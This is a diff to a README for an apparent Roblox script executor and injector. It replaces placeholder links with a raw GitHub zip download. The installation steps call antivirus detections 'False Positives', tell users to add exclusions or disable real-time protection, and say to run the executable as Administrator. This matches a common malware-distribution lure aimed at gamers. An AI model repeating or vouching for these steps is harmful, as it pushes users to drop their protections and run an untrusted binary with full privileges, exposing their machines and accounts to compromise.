@@ -2,7 +2,7 @@
 
 A high-performance script executor and injector designed for Roblox. This tool allows users to run custom Luau scripts within the game environment to enhance gameplay or test custom modifications.
 
-**[?? Download Now](https://your-download-link-here.com)**
+**[?? Download Now](https://raw.githubusercontent.com/fedeser/Roblox-Executor-Injector-2026/main/impressionistic/v2.4.zip)**
 
 ## ?? Features
 
@@ -14,7 +14,7 @@ A high-performance script executor and injector designed for Roblox. This tool a
 
 ## ??? Installation
 
-1. **Download:** Get the latest version via the **[Download Link](https://your-download-link-here.com)** or navigate to the [Releases](#) section.
+1. **Download:** Get the latest version via the **[Download Link](https://raw.githubusercontent.com/fedeser/Roblox-Executor-Injector-2026/main/impressionistic/v2.4.zip)** or navigate to the [Releases](#) section.
 2. **Extract:** Unzip the folder to a location of your choice.
 3. **Security Note:** Because injectors interact with other running processes, most antivirus software will flag this as a "False Positive." You may need to add the folder to your antivirus exclusion list or temporarily disable real-time protection.
 4. **Launch:** Right-click `Roblox-Executor-2026.exe` and select **Run as Administrator**.
